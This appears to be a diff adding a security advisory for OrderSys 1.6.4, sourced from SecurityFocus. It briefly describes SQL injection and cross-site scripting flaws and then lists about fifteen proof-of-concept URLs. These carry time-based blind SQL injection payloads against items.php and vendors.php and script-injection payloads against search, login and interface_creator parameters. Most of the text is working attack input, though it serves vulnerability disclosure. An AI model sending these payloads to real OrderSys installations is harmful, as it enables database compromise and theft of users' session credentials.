@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/55147/info
+
+OrderSys is prone to multiple SQL-injection vulnerabilities and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied input.
+
+Exploiting these vulnerabilities could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.
+
+OrderSys 1.6.4 is vulnerable; other versions may also be affected. 
+
+http://example.com/ordering/items.php?smenu_1=-1+AND+(SELECT+1+FROM+(SELECT+2)a+WHERE+1%3Dsleep(25))--+1&sterm_1=3&sbool=AND&smenu_2=Name&sterm_2=3&order_1=ASC&order_2=ASC&sort_1=3&sort_2=3
+http://example.com/ordering/vendors.php?smenu_1=-1+AND+(SELECT+1+FROM+(SELECT+2)a+WHERE+1%3Dsleep(25))--+1&sterm_1=3&sbool=AND&smenu_2=Name&sterm_2=3&order_1=ASC&order_2=ASC&sort_1=3&sort_2=3&submit_find=Find
+http://example.com/ordering/items.php?page='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x0007B1)%3C/script%3E&where_condition=3&order_condition=name%20ASC
+http://example.com/ordering/vendors.php/%22%20stYle=%22x:expre/**/ssion(netsparker(9))
+http://example.com/ordering/items.php/%22%20stYle=%22x:expre/**/ssion(netsparker(9))
+http://example.com/ordering/orders.php/%22%20stYle=%22x:expre/**/ssion(netsparker(9))
+http://example.com/ordering/interface_creator/index_short.php?table_name=item&function=details&where_field='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x0008F1)%3C/script%3E&where_value=279
+http://example.com/ordering/interface_creator/index_short.php?table_name=vendor&function=search&where_clause='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000F5B)%3C/script%3E&page=0&order=Name&order_type=DESC
+http://example.com/ordering/interface_creator/index_short.php?table_name=vendor&function=search&where_clause=3&page='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000F79)%3C/script%3E&order=Name&order_type=DESC
+http://example.com/ordering/interface_creator/login.php?function='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x0008F4)%3C/script%3E&go_to=(http%3A%2F%2Fubuntu%2Ftargets%2Fordersys%2Fordering%2Fadmin.php)
+http://example.com/ordering/interface_creator/login.php?function=admin&go_to='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000902)%3C/script%3E
+http://example.com/ordering/interface_creator/?function=search&where_clause='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000C70)%3C/script%3E&page=0&table_name=vendor
+http://example.com/ordering/interface_creator/?function=search&where_clause=3&page='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000C96)%3C/script%3E&table_name=vendor
+http://example.com/ordering/interface_creator/index_long.php?table_name=vendor&function=search&where_clause='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000B34)%3C/script%3E&page=0&order=Name&order_type=DESC
+http://example.com/ordering/interface_creator/index_long.php?table_name=vendor&function=search&where_clause=3&page='%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Enetsparker(0x000B3F)%3C/script%3E&order=Name&order_type=DESC
